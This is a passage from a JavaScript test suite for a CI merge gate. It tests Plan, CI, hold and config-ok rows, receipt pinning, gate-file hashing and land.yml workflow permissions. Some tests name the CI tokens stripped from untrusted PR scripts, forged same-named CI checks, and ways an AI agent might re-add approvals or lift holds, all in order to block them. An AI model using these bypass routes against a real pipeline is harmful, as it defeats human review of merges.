  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["plan"], "no Plan on an agent PR");
  f.pull.body = "## Plan\n- [x] done\n"; f.checks[1].conclusion = "failure";
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["ci", "retest"]);
  f.checks[1].conclusion = "success";
  f.files.push({ filename: ".github/workflows/land.yml" });
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["config"], "a workflow edit without Bryce's config-ok");
  f.pull.labels = [{ name: "config-ok" }]; f.events.push(ev("config-ok", "2026-11-03T10:00:00Z"));
  assert.equal(evaluate({ pr: 7, ...f.deps }).ok, true, "config-ok by Bryce's own click");
  f.events.push(ev("config-ok", "2026-11-03T10:05:00Z", { app: APP }));
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["config"], "an agent's re-add on land.yml (protected) does not count (#5455)");
  f.files[f.files.length - 1] = { filename: ".github/workflows/dispatch.yml" };
  const agentOk = evaluate({ pr: 7, ...f.deps });
  assert.equal(agentOk.ok, true, "an agent's config-ok covers a routine workflow (#5455): " + agentOk.rows.config.evidence);
  assert.match(agentOk.rows.config.evidence, /by agent \(claude app\), routine paths only/);
  f.events.pop(); f.files[f.files.length - 1] = { filename: ".github/workflows/land.yml" };
  f.prRuns.push({ head_sha: "c".repeat(40), created_at: "2026-11-03T09:30:00Z", pull_requests: [{ number: 7 }] });
  f.prRuns[0].created_at = "2026-11-03T10:30:00Z";
  const later = (p) => (p.startsWith("compare/") ? { json: { files: [{ filename: ".github/workflows/land.yml" }] } } : f.deps.request(p));
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps, request: later }).rows[k].ok), ["config"], "a workflow push after Bryce's config-ok needs a fresh one");
  f.prRuns.pop(); f.prRuns[0].created_at = "2026-11-03T09:00:00Z";
  f.files.push({ filename: "docs/TESTING.md", previous_filename: ".githooks/pre-push" });
  f.pull.labels = []; f.events.length = 0;
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["config"], "a rename out of a config path needs config-ok");
  f.files.pop(); f.pull.labels = [{ name: "config-ok" }]; f.events.push(ev("config-ok", "2026-11-03T10:00:00Z"));
  f.events.push(ev("hold", "2026-11-03T10:30:00Z"), ev("hold", "2026-11-03T11:00:00Z", { event: "unlabeled", app: APP }));
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["hold"], "a hold an agent removed still holds");
  f.events.length = 1; f.pull.labels = []; f.files.pop();
  const refused = evaluate({ pr: 7, ...f.deps, localMerge: () => ({ ok: false, evidence: "conflicts with the current tip", tip: TIP }) });
  assert.deepEqual(ROWS.filter((k) => !refused.rows[k].ok), ["gen", "ratchets", "retest"], "a refused merge leaves the ratchets and the re-test unproven");
  f.pull.draft = true; f.calls.length = 0;
  const draft = evaluate({ pr: 7, ...f.deps });
  assert.deepEqual(ROWS.filter((k) => !draft.rows[k].ok), ["open", "gen", "ratchets", "retest"]);
  assert.equal(f.calls.length, 0, "no throw-away merge for a PR that is not open and ready");
  f.pull.draft = false;
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, sha: "b".repeat(40), ...f.deps }).rows[k].ok), ["open", "gen", "ratchets", "retest"], "--sha must be the current head");
  assert.equal(evaluate({ pr: 7, sha: HEAD.slice(0, 12), ...f.deps }).ok, true, "a prefix of the head is the head");
  assert.ok(/HTTP 500/.test(evaluate({ pr: 7, ...f.deps, request: () => ({ error: "HTTP 500" }) }).error));
  assert.ok(/fetch failed/.test(evaluate({ pr: 7, ...f.deps, localMerge: () => ({ ok: false, evidence: "fetch failed", error: true }) }).error));
  const noEvents = (p) => (p.startsWith("issues/7/events") ? { error: "HTTP 502" } : f.deps.request(p));
  assert.equal(evaluate({ pr: 7, ...f.deps, request: noEvents }).error, "events of PR #7: HTTP 502", "unreadable provenance is an error (will retry), never a pass");
  const fullPages = (p) => (p.startsWith("issues/7/events") ? { json: Array.from({ length: 100 }, () => ev("x", "2026-11-03T10:00:00Z")) } : f.deps.request(p));
  assert.equal(evaluate({ pr: 7, ...f.deps, request: fullPages }).error, "events of PR #7: more than 10 pages of 100: truncated, refusing to judge a partial list", "a newer hold past the last page must not be unseen");
  const noFiles = (p) => (p.startsWith("pulls/7/files") ? { error: "HTTP 502" } : f.deps.request(p));
  assert.equal(evaluate({ pr: 7, ...f.deps, request: noFiles }).error, "files of PR #7: HTTP 502");
});

test("evaluate: a gen:check or conflict refusal refuses on its own row, never masked as an error, and carries the fetched tip (#3964, 2026-10-27)", () => {
  const f = fakes();
  const GEN_TIP = "abc" + "0".repeat(37);
  const genFail = () => ({ ok: false, evidence: `gen:check fails on the merge onto ${GEN_TIP.slice(0, 8)}: docs/agent-index.json drift`, tip: GEN_TIP });
  const v = evaluate({ pr: 7, ...f.deps, localMerge: genFail });
  assert.equal(v.error, undefined, v.error);
  assert.deepEqual([v.ok, v.waiting, v.tip], [false, false, GEN_TIP]);
  assert.deepEqual(ROWS.filter((k) => !v.rows[k].ok), ["gen", "ratchets", "retest"]);
  assert.ok(v.rows.gen.evidence.startsWith("gen:check fails"), v.rows.gen.evidence);
  const logs = [];
  assert.equal(main(["--pr", "7", "--sha", HEAD, "--check"], { ...f.deps, localMerge: genFail, log: (l) => logs.push(l) }), 2, "a refusal (exit 2), not an error (exit 1)");
  assert.ok(logs.some((l) => l.startsWith("= gate gen: FAIL gen:check fails")), logs.join("\n"));
  assert.equal(logs.at(-1), `= merge-gate refused — open=ok hold=ok plan=ok ci=ok config=ok raise=ok gen=FAIL ratchets=FAIL retest=FAIL pr=#7 sha=${HEAD} tip=${GEN_TIP}`);
  const noTip = evaluate({ pr: 7, ...f.deps, localMerge: () => ({ ok: false, evidence: "conflicts with the current tip", tip: "" }) });
  assert.equal(noTip.error, undefined, noTip.error);
  assert.deepEqual([ROWS.filter((k) => !noTip.rows[k].ok), noTip.tip], [["gen", "ratchets", "retest"], ""]);
});

test("main: one `= gate <row>:` line per row and a summary; exit 0 all ok, 2 a row failed, 1 usage/API error; --json writes the summary", () => {
  const f = fakes();
  const logs = [];
  const written = {};
  const deps = { ...f.deps, log: (l) => logs.push(l), write: (p, text) => { written[p] = JSON.parse(text); } };
  assert.equal(main(["--pr", "7", "--sha", HEAD, "--check"], deps), 0);
  assert.deepEqual(logs.slice(0, ROWS.length).map((l) => l.split(" ").slice(0, 4).join(" ")), ROWS.map((k) => `= gate ${k}: ok`));
  assert.ok(logs[ROWS.length].startsWith("= merge-gate passed — open=ok hold=ok plan=ok ci=ok config=ok raise=ok gen=ok ratchets=ok retest=ok pr=#7 sha=" + HEAD), logs[ROWS.length]);
  logs.length = 0;
  f.files.push({ filename: ".claude/hooks/bash-guard.sh" });
  assert.equal(main(["--pr", "7", "--json", "artifacts/g.json"], deps), 2);
  assert.ok(logs.some((l) => l === "= gate config: FAIL needs config-ok from brycejmurrin: the diff edits .claude/hooks/bash-guard.sh; protected path(s), his own tap only: .claude/hooks/bash-guard.sh"), logs.join("\n"));
  assert.ok(logs.at(-1).startsWith("= merge-gate refused — open=ok hold=ok plan=ok ci=ok config=FAIL"));
  const j = written["/nowhere/artifacts/g.json"];
  assert.equal(j.ok, false); assert.equal(j.rows.config.ok, false); assert.equal("maxBehind" in j, false);
  f.files.pop();
  assert.equal(main(["--pr", "7", "--sha", "b".repeat(40)], deps), 2, "a stale --sha refuses");
  assert.equal(main([], deps), 1, "no --pr");
  assert.equal(main(["--pr", "7", "--max-behind", "0"], deps), 1, "--max-behind is gone with the distance row");
  assert.equal(main(["--pr", "7"], { ...deps, request: () => ({ error: "HTTP 502" }) }), 1, "API error");
  assert.ok(logs.at(-1).startsWith("= merge-gate error — PR #7: HTTP 502"));
  assert.deepEqual(rowLines({ ok: false, pr: 1, rows: { open: { ok: false, evidence: "PR is closed" } } }), ["= gate open: FAIL PR is closed", "= merge-gate refused — open=FAIL pr=#1 sha= tip="]);
});

// ---- the receipt (tools/lib/gate-receipt.mjs): ready-gate writes it before a draft→ready flip and ship-pr reads it.
// Its Python hook twin (merge_policy.py) left with the hook reset of 2026-11-03: the flip is no longer gated on a
// receipt (the Plan gate and the CI check judge it). No tool writes a merge receipt (a session never merges).

test("receiptVerdict: same PR and kind, ok, fresh; a merge pins its head", () => {
  const dir = scratch("gate-receipt-");
  try {
    const now = Date.parse("2026-10-19T20:00:00Z");
    const at = (minAgo) => new Date(now - minAgo * 60000).toISOString();
    const both = (kind, pr, head) => receiptVerdict(readReceipt(dir, kind, pr), { kind, pr, head, now });
    assert.ok(/no ready-gate receipt for #7/.test(both("ready", 7, "").why));
    assert.equal(both("merge", 0, HEAD).ok, false);
    writeReceipt(dir, "ready", { pr: 7, head: HEAD, ok: true, at: at(5) });
    assert.equal(fs.existsSync(receiptPath(dir, "ready", 7)), true);
    assert.equal(both("ready", 7, "").ok, true, "a ready receipt needs no head pin");
    assert.equal(both("merge", 7, HEAD).ok, false, "a ready receipt is not a merge receipt");
    assert.equal(MAX_AGE_MIN, 10);
    writeReceipt(dir, "ready", { pr: 7, head: HEAD, ok: true, at: at(MAX_AGE_MIN + 1) });
    assert.ok(/min old/.test(both("ready", 7, "").why));
    writeReceipt(dir, "ready", { pr: 7, head: HEAD, ok: false, evidence: "plan-open: 1 of 3 Plan item(s) open", at: at(1) });
    assert.ok(/refused \(plan-open/.test(both("ready", 7, "").why));
    writeReceipt(dir, "ready", { pr: 7, head: HEAD, ok: true, at: at(1) });
    // writeReceipt refuses "merge" (no tool writes one): the readers' merge case is a hand-written fixture of the
    // pure reader only. No hook door consults a merge receipt (tests/unit/bash-guard-hardening.test.mjs).
    fs.mkdirSync(path.dirname(receiptPath(dir, "merge", 7)), { recursive: true });
    fs.writeFileSync(receiptPath(dir, "merge", 7), JSON.stringify({ kind: "merge", pr: 7, head: HEAD, ok: true, at: at(1) }));
    assert.equal(both("merge", 7, HEAD.slice(0, 10)).ok, true, "a prefix pins the same head");
    assert.ok(/pin expectedHeadSha/.test(both("merge", 7, "").why));
    assert.ok(/not the gated head/.test(both("merge", 7, "b".repeat(40)).why));
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("a receipt written from a linked worktree also lands in the main checkout the hooks read", () => {
  const main = scratch("rcpt-main-");
  const wt = path.join(main, "..", path.basename(main) + "-wt");
  const g = (cwd, ...a) => { const r = spawnSync("git", a, { cwd, encoding: "utf8" }); assert.equal(r.status, 0, r.stderr); return r.stdout.trim(); };
  try {
    g(main, "init", "-q"); g(main, "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "x");
    g(main, "worktree", "add", "-q", wt);
    assert.equal(mainCheckout(main), null);
    assert.equal(fs.realpathSync(mainCheckout(wt)), fs.realpathSync(main));
    writeReceipt(wt, "ready", { pr: 9, head: HEAD, ok: true });
    assert.equal(readReceipt(main, "ready", 9).pr, 9, "the hook's root has the receipt");
  } finally { fs.rmSync(wt, { recursive: true, force: true }); fs.rmSync(main, { recursive: true, force: true }); }
});

test("a receipt records the gate files' sha256; gateFilesVerdict refuses an edited or uncommitted gate", () => {
  const dir = scratch("gate-files-");
  const g = (...a) => spawnSync("git", ["-C", dir, ...a], { encoding: "utf8" });
  try {
    g("init", "-q"); g("config", "user.email", "t@t"); g("config", "user.name", "t");
    for (const f of gateClosure(ROOT)) { fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true }); fs.copyFileSync(path.join(ROOT, f), path.join(dir, f)); }
    g("add", "-A"); g("commit", "-qm", "gate");
    writeReceipt(dir, "ready", { pr: 5, head: HEAD, ok: true }, { main: null, gateRoot: dir });
    const rc = readReceipt(dir, "ready", 5);
    assert.deepEqual(rc.gateFiles, gateFileHashes(dir));
    const both = (receipt) => gateFilesVerdict(dir, receipt);
    assert.equal(both(rc).ok, true, "the committed gate's receipt");
    const f = path.join(dir, "tools/ci/ready-gate.mjs");
    const orig = fs.readFileSync(f, "utf8");
    fs.writeFileSync(f, orig + "// edited\n");
    assert.ok(/not the file that wrote this receipt/.test(both(rc).why));
    assert.ok(/differ from HEAD/.test(both({ ...rc, gateFiles: gateFileHashes(dir) }).why), "the edited gate hashed itself: still refused");
    fs.writeFileSync(f, orig);
    assert.ok(/no gate-file hashes/.test(both({ ...rc, gateFiles: undefined }).why));
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("untrustedEnv: the merge result's scripts get no token and no runner file-command path (land.yml gate)", () => {
  const env = untrustedEnv({
    PATH: "/usr/bin", HOME: "/home/runner", CI: "true", GITHUB_REPOSITORY: "o/r", GITHUB_SHA: "abc",
    GH_TOKEN: "x", GITHUB_TOKEN: "x", LAND_TOKEN: "x", NODE_AUTH_TOKEN: "x", ACTIONS_RUNTIME_TOKEN: "x", ACTIONS_ID_TOKEN_REQUEST_URL: "u",
    GITHUB_OUTPUT: "/o", GITHUB_ENV: "/e", GITHUB_PATH: "/p", GITHUB_STATE: "/s", GITHUB_STEP_SUMMARY: "/sum", SOME_SECRET: "x",
  });
  assert.deepEqual(Object.keys(env).sort(), ["CI", "GITHUB_REPOSITORY", "GITHUB_SHA", "HOME", "PATH"]);
});

// System audit 4 (2026-10-26) group A1, ported from the base on the 2026-10-27 sync: the gate closure, future-dated
// receipts, the ready head pin and the READY claim path (tools/lib/gate-receipt.mjs).
test("audit 4: the hashed gate set is the static import closure, recorded in the receipt", () => {
  assert.deepEqual(staticImports(`import a from "./a.mjs";\nimport {\n  b,\n  c as d\n} from "../lib/b.mjs";\nimport "./side.mjs";\nexport * from "./e.mjs";\nexport { f } from "./f.mjs";\nconst s = 'x from "./not.mjs"';\nimport fs from "node:fs";\n`),
    ["./a.mjs", "../lib/b.mjs", "./side.mjs", "./e.mjs", "./f.mjs"]);
  const c = gateClosure(ROOT);
  assert.deepEqual([...GATE_FILES, "tools/ci/github-api.mjs", "tools/lib/cli-args.mjs"].filter((f) => !c.includes(f)), []);
  assert.deepEqual(Object.keys(gateFileHashes(ROOT)).sort(), c);
  const dir = scratch("gate-closure-");
  try {
    writeReceipt(dir, "ready", { pr: 3, head: HEAD, ok: true }, { main: null });
    const rc = readReceipt(dir, "ready", 3);
    assert.deepEqual(rc.gateClosure, c, "the list rides in the receipt for the Python twin");
    assert.deepEqual(Object.keys(rc.gateFiles).sort(), c, "gateFiles maps every closure file");
    // a receipt that recorded only the three seeds (an older gate) is refused by the closure check
    const seeds = Object.fromEntries(GATE_FILES.map((f) => [f, rc.gateFiles[f]]));
    const unrec = c.filter((f) => !GATE_FILES.includes(f));
    assert.equal(gateFilesVerdict(ROOT, { ...rc, gateRoot: ROOT, gateFiles: seeds }).why,
      `the receipt does not record ${unrec.slice(0, 4).join(", ")}${unrec.length > 4 ? ", ..." : ""} of the gate's import closure in ${ROOT} (an older gate or an edited import): re-run the gate`);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("ready receipt keyed to head + Plan: valid past 10 min while both match; a push, a Plan edit or the 24 h backstop invalidates it", () => {
  const dir = scratch("gate-receipt-bound-");
  try {
    const now = Date.parse("2026-10-30T12:00:00Z");
    const at = (minAgo) => new Date(now - minAgo * 60000).toISOString();
    const PLAN = planHash("## Plan\n- [x] a\n- [ ] land: x\n");
    const NEW = "b".repeat(40);
    const both = (head, plan) => receiptVerdict(readReceipt(dir, "ready", 7), { kind: "ready", pr: 7, head, plan, now });
    const row = (head, plan) => { const v = both(head, plan); return v.ok ? "ok" : v.why.replace(/ \(max.*/, ""); };
    writeReceipt(dir, "ready", { pr: 7, head: HEAD, ok: true, planHash: PLAN, at: at(30) }, { main: null });
    const rows = [row(HEAD, PLAN), row(NEW, PLAN), row(HEAD, planHash("## Plan\n- [x] a\n- [x] b\n")).slice(0, 26), row(HEAD, "").slice(0, 20)];
    writeReceipt(dir, "ready", { pr: 7, head: HEAD, ok: true, planHash: PLAN, at: at(BOUND_MAX_AGE_MIN + 1) }, { main: null });
    rows.push(both(HEAD, PLAN).why.replace(/^.*(max \d+, the backstop).*$/, "$1"));
    writeReceipt(dir, "ready", { pr: 7, head: HEAD, ok: true, at: at(1) }, { main: null });
    rows.push(both(HEAD, PLAN).why.replace(/^.*(records no Plan hash).*$/, "$1"));
    assert.deepEqual(rows, ["ok", "the PR head is bbbbbbbbbbbb, but ready-gate passed on aaaaaaaaaaaa: re-run ready-gate on the current head",
      "the PR's Plan section chan", "the ready-gate recei", "max 1440, the backstop", "records no Plan hash"],
    "same head+Plan after 30 min ok; new head; Plan edited; no live Plan hash falls back to the 10 min window; past the backstop; old receipt");
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("planHash: CRLF, trailing blanks and edits outside the Plan do not change it", () => {
  const bodies = ["", "no plan", "## Goal\nx\n## Plan\n- [x] a  \n\n- [ ] land: y\n## Verified\nz", "## Plan\r\n- [x] a\r\n- [ ] land: y\r\n",
    "## Plan\n- [ ] outer\n<!-- CURSOR_AGENT_PR_BODY_BEGIN -->\n## Plan\n- [x] agent\n<!-- CURSOR_AGENT_PR_BODY_END -->", "<!-- c -->\n## Plan\n- [x] é"];
  const same = (x, y) => planHash(x) === planHash(y);
  assert.deepEqual([...bodies.map((b) => typeof planHash(b) === "string" && planHash(b) === planHash(b)),
    same(bodies[2], "## Goal\nchanged\n## Plan\n- [x] a\n- [ ] land: y\n## Verified\nother"), same(bodies[3], "## Plan\n- [x] a\n- [ ] land: y"), same(bodies[3], "## Plan\n- [x] a\n- [x] land: y")],
  [true, true, true, true, true, true, true, true, false]);
});

test("audit 4: a future-dated receipt is refused; a ready receipt is pinned to the PR's current head", () => {
  const now = Date.parse("2026-10-26T20:00:00Z");
  const r = (sAhead, extra = {}) => ({ kind: "merge", pr: 7, head: HEAD, ok: true, at: new Date(now + sAhead * 1000).toISOString(), ...extra });
  assert.equal(MAX_FUTURE_S, 60);
  assert.equal(receiptVerdict(r(30), { kind: "merge", pr: 7, head: HEAD, now }).ok, true, "seconds of clock skew pass");
  const future = (s) => `the merge-gate receipt for #7 is dated ${s} s in the future (max 60): a receipt is written by the gate, never by hand; re-run the gate`;
  assert.equal(receiptVerdict(r(3600), { kind: "merge", pr: 7, head: HEAD, now }).why, future(3600));
  assert.equal(receiptVerdict(r(0, { at: "2099-01-01T00:00:00Z" }), { kind: "merge", pr: 7, head: HEAD, now }).why, future(Math.round((Date.parse("2099-01-01T00:00:00Z") - now) / 1000)));
  const ready = r(-60, { kind: "ready" });
  assert.equal(receiptVerdict(ready, { kind: "ready", pr: 7, now }).ok, true, "no head known: age and ok only");
  assert.equal(receiptVerdict(ready, { kind: "ready", pr: 7, head: HEAD.slice(0, 9), now }).ok, true);
  assert.equal(receiptVerdict(ready, { kind: "ready", pr: 7, head: "b".repeat(40), now }).why, "the PR head is bbbbbbbbbbbb, but ready-gate passed on aaaaaaaaaaaa: re-run ready-gate on the current head");
  assert.equal(headPinProblem(HEAD, HEAD.slice(0, 7)), "");
  assert.notEqual(headPinProblem(HEAD, "aaaa"), "", "under 7 hex never pins");
});

test("audit 4: gateFilesVerdict refuses a receipt whose gate-file hash differs from the checkout that wrote it", () => {
  const dir = scratch("ready-claim-");
  try {
    writeReceipt(dir, "ready", { pr: 12, head: HEAD, ok: true }, { main: null });
    const rp = receiptPath(dir, "ready", 12), receipt = JSON.parse(fs.readFileSync(rp, "utf8"));
    assert.equal(gateFilesVerdict(receipt.gateRoot, receipt, { run: () => ({ status: 0 }) }).ok, true, "the hashes writeReceipt took (git stubbed: this checkout may be dirty)");
    receipt.gateFiles["tools/ci/ready-gate.mjs"] = "0".repeat(64);
    assert.deepEqual(gateFilesVerdict(receipt.gateRoot, receipt), { ok: false,
      why: `tools/ci/ready-gate.mjs in ${receipt.gateRoot} is not the file that wrote this receipt: re-run the gate from this checkout` });
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test("CI not finished is WAIT, not FAIL: exit 3 only when every other row is ok (land.yml posts `gate` in_progress)", () => {
  assert.equal(ciVerdict([]).pending, true, "no CI check-run yet");
  assert.equal(ciVerdict([{ id: 1, name: "CI", app: GHA, status: "in_progress" }]).pending, true);
  assert.equal(ciVerdict([{ id: 1, name: "CI", app: GHA, status: "completed", conclusion: "failure" }]).pending, undefined, "a finished red CI refuses");
  const f = fakes();
  f.checks[1].status = "in_progress"; delete f.checks[1].conclusion;
  const logs = [];
  const deps = { ...f.deps, log: (l) => logs.push(l) };
  assert.equal(main(["--pr", "7", "--sha", HEAD, "--check"], deps), 3);
  assert.ok(logs.some((l) => l.startsWith("= gate ci: WAIT CI in_progress")), logs.join("\n"));
  assert.ok(logs.at(-1).startsWith("= merge-gate waiting — open=ok hold=ok plan=ok ci=WAIT"), logs.at(-1));
  f.pull.body = "## Plan\n- [ ] still open\n";
  logs.length = 0;
  assert.equal(main(["--pr", "7", "--sha", HEAD, "--check"], deps), 2, "a real refusal next to a waiting CI refuses");
  assert.ok(logs.at(-1).startsWith("= merge-gate refused —"), logs.at(-1));
});

test("ciVerdict: only the GitHub Actions app's `CI` counts; a same-named check from another app (or none) is ignored", () => {
  assert.equal(CI_APP, "github-actions");
  const forged = { id: 9, name: "CI", app: { slug: "some-app" }, status: "completed", conclusion: "success" };
  const bare = { id: 8, name: "CI", status: "completed", conclusion: "success" };
  assert.equal(ciVerdict([forged]).ok, false);
  assert.equal(ciVerdict([forged]).pending, true, "no CI from the Actions app yet is waiting");
  assert.equal(ciVerdict([bare]).ok, false, "a check-run with no app is not trusted");
  const red = { id: 2, name: "CI", app: GHA, status: "completed", conclusion: "failure" };
  assert.equal(ciVerdict([red, forged]).ok, false, "a newer forged success does not replace the real red");
  assert.equal(ciVerdict([red, { ...red, id: 3, conclusion: "success" }]).ok, true);
  const f = fakes();
  f.checks[1].app = { slug: "not-actions" };
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["ci", "retest"]);
});

// ---- WP-L3e: the ci row reads ci.yml's own `CI`, not any Actions check-run of that name -------------------------

test("ciVerdict pinned to ci.yml: a `CI` check-run in another workflow's suite is ignored, ci.yml's newest attempt decides", () => {
  assert.equal(CI_WORKFLOW, "ci.yml");
  const real = { id: 2, name: "CI", app: GHA, status: "completed", conclusion: "failure", check_suite: { id: 50 } };
  const rogue = { id: 9, name: "CI", app: GHA, status: "completed", conclusion: "success", check_suite: { id: 77 } };
  assert.equal(ciVerdict([real, rogue], "CI", CI_APP, new Set([50])).ok, false, "a newer green `CI` from another workflow does not hide ci.yml's red");
  assert.equal(ciVerdict([rogue], "CI", CI_APP, new Set([50])).pending, true, "no ci.yml `CI` yet is waiting");
  assert.equal(ciVerdict([real, { ...real, id: 3, conclusion: "success" }], "CI", CI_APP, new Set([50])).ok, true);
  const f = fakes();
  f.checks.push(rogue); f.checks[1].conclusion = "failure";
  assert.deepEqual(ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps }).rows[k].ok), ["ci", "retest"], "evaluate pins the row to ci.yml's suites");
  f.checks[1].conclusion = "success"; f.runs[0].path = ".github/workflows/other.yml";
  assert.equal(evaluate({ pr: 7, ...f.deps }).rows.ci.pending, true, "a run whose path is not ci.yml contributes no suite");
});

test("ciSuitesFor: the ci.yml runs on the head (path re-checked, a ref suffix tolerated); an API error is an error", () => {
  const seen = [];
  const req = (p) => { seen.push(p); return { json: { workflow_runs: [{ check_suite_id: 1, path: ".github/workflows/ci.yml" }, { check_suite_id: 2, path: ".github/workflows/ci.yml@refs/heads/x" }, { check_suite_id: 3, path: ".github/workflows/land.yml" }] } }; };
  assert.deepEqual([...ciSuitesFor(HEAD, req).suites].sort(), [1, 2]);
  assert.equal(seen[0], `actions/workflows/ci.yml/runs?head_sha=${HEAD}&per_page=100`);
  assert.equal(ciSuitesFor(HEAD, () => ({ error: "HTTP 403" })).error, "HTTP 403");
});

// ---- WP-L2: --trusted runs no PR code; post takes open/hold/plan/ci/config from it, never from the artifact -----

test("--trusted: only the rows no PR code decides (GitHub reads only), no throw-away merge, no fetch", () => {
  assert.deepEqual([...TRUSTED_ROWS], ["open", "hold", "plan", "ci", "config", "raise"]);
  const f = fakes();
  const v = evaluate({ pr: 7, ...f.deps, trusted: true });
  assert.equal(v.ok, true, JSON.stringify(v.rows));
  assert.deepEqual(Object.keys(v.rows), TRUSTED_ROWS);
  assert.equal(v.tip, TIP, "the base tip from GitHub (no git): land.yml post requires it to equal the land-gate leg's tip (#4592)");
  assert.deepEqual(f.calls, [], "localMerge (the PR's scripts) never runs");
  f.pull.body = "## Plan\n- [ ] still open\n";
  assert.deepEqual(TRUSTED_ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps, trusted: true }).rows[k].ok), ["plan"]);
  f.pull.body = "## Plan\n- [x] done\n";
  f.files.push({ filename: ".githooks/pre-commit" });
  assert.deepEqual(TRUSTED_ROWS.filter((k) => !evaluate({ pr: 7, ...f.deps, trusted: true }).rows[k].ok), ["config"]);
  f.files.pop();
  const logs = [];
  assert.equal(main(["--pr", "7", "--sha", HEAD, "--trusted"], { ...f.deps, log: (l) => logs.push(l) }), 0);
  assert.equal(logs.at(-1), `= merge-gate passed — open=ok hold=ok plan=ok ci=ok config=ok raise=ok pr=#7 sha=${HEAD} tip=${TIP}`);
  f.checks[1].status = "in_progress";
  assert.equal(main(["--pr", "7", "--sha", HEAD, "--trusted"], { ...f.deps, log: () => {} }), 3, "CI running is waiting");
});

// ---- WP-L1 / WP-L3: land.yml's trust shape and its logic, read from the parsed workflow and executed ------------

const LAND = parseYAML(fs.readFileSync(path.join(ROOT, ".github/workflows/land.yml"), "utf8"));
const DEPLOY_BRANCH = "claude/f1-game-project-26h3ng";
const writes = (j) => j.permissions === "write-all" || Object.values(j.permissions || {}).some((v) => v === "write");
const usesSecret = (j) => /\bsecrets\./.test(JSON.stringify(j));
const runsRepoCode = (j) => (j.steps || []).some((st) => /actions\/checkout@/.test(st.uses || "") || /(^|[\s;(|&])(node|npm|npx)\s/m.test(st.run || ""));
const jobsWhere = (pred) => Object.keys(LAND.jobs).filter((k) => pred(LAND.jobs[k]));

/** A GitHub expression `${{ … }}` evaluated as JS: `==`/`!=`, `&&`/`||` returning operands, missing paths null. */
function ghExpr(src, github) {
  const inner = String(src).trim().replace(/^\$\{\{/, "").replace(/\}\}$/, "");
  const js = inner.replace(/!=/g, "!==").replace(/([^!=])==(?!=)/g, "$1===")
    .replace(/\bgithub((?:\.[\w-]+|\[\d+\])+)/g, (m, rest) => "ctx" + rest.replace(/\./g, "?.").replace(/\[/g, "?.["))
    .replace(/\.\*\.(\w+)/g, ".map?.((x) => x.$1)"); // object filter `labels.*.name`
  const format = (f, ...a) => f.replace(/\{(\d+)\}/g, (_, i) => String(a[i] ?? ""));
  const contains = (hay, x) => (Array.isArray(hay) ? hay.includes(x) : String(hay ?? "").includes(x));
  const startsWith = (a, b) => String(a ?? "").startsWith(b);
  const cancelled = () => false;
  return new Function("ctx", "format", "contains", "startsWith", "cancelled", "needs", "steps", "success", `return (${js.replace(/\bneeds\./g, "needs?.")});`)(github, format, contains, startsWith, cancelled, github?.needs, github?.steps, () => github?.success !== false);
}

test("land.yml triggers: pull_request_target (never pull_request), workflow_run kept, check_suite gone", () => {
  const on = LAND.on;
  assert.equal(on.pull_request, undefined, "plain pull_request runs the PR's own copy of land.yml with its secrets");
  assert.deepEqual(on.pull_request_target, { types: ["labeled", "unlabeled", "ready_for_review", "converted_to_draft", "synchronize", "reopened", "edited"], branches: [DEPLOY_BRANCH] });
  assert.deepEqual(on.workflow_run, { workflows: ["CI", "Deploy to GitHub Pages"], types: ["completed"] }, "the CI / train re-gate stays");
  assert.deepEqual(Object.keys(on.workflow_dispatch.inputs), ["pr", "head", "attempt", "stale"], "the immediate re-gate: one PR, the head its budget counts against, the attempt; or the stale-gate sweep (no AUTO-SYNC input since 2026-11-03)");
  assert.equal(on.repository_dispatch, undefined);
  assert.equal(on.check_suite, undefined, "check_suite never fires for Actions-made suites (0 runs in 14 days)");
  assert.deepEqual(LAND.permissions, {}, "the workflow-level token has no permissions; each job states its own");
});

test("land.yml: no job holding a write permission or a secret checks out or runs code; the PR-code legs are read-only", () => {
  assert.deepEqual(jobsWhere(writes), ["post", "retry", "sweep"]);
  assert.deepEqual(jobsWhere(usesSecret), ["post"], "LAND_TOKEN lives in post alone (the sync job left with AUTO-SYNC, 2026-11-03)");
  assert.deepEqual(jobsWhere(runsRepoCode), ["trusted-rows", "land-gate"], "only the read-only legs check out or run code");
  const readOnly = { contents: "read", "pull-requests": "read", checks: "read", actions: "read" };
  assert.deepEqual(LAND.jobs["land-gate"].permissions, readOnly);
  assert.deepEqual(LAND.jobs["trusted-rows"].permissions, readOnly);
  for (const name of jobsWhere(runsRepoCode)) {
    for (const st of LAND.jobs[name].steps) {
      if (/actions\/checkout@/.test(st.uses || "")) {
        assert.equal(st.with?.ref, "${{ env.DEPLOY_BRANCH }}", `${name}: checks out the deploy branch by name, never the PR head`);
        assert.equal(st.with?.["persist-credentials"], false, `${name}: no token left in .git/config`);
      }
      if (/actions\/setup-node@/.test(st.uses || "")) assert.equal(st.with?.cache, undefined, `${name}: no dependency cache (deploy-branch cache scope: poisoning)`);
    }
  }
  assert.deepEqual(LAND.jobs.post.needs, ["resolve", "trusted-rows", "land-gate"], "post reads the trusted rows next to the artifact");
});

test("land.yml concurrency (WP-L3a, c): noise labels run alone, CI re-gates never join the train's group, PR events cancel", () => {
  const group = (github) => ghExpr(LAND.concurrency.group, github);
  const prt = (action, label) => ({ event_name: "pull_request_target", run_id: 99, event: { action, label: label && { name: label }, pull_request: { number: 7 } } });
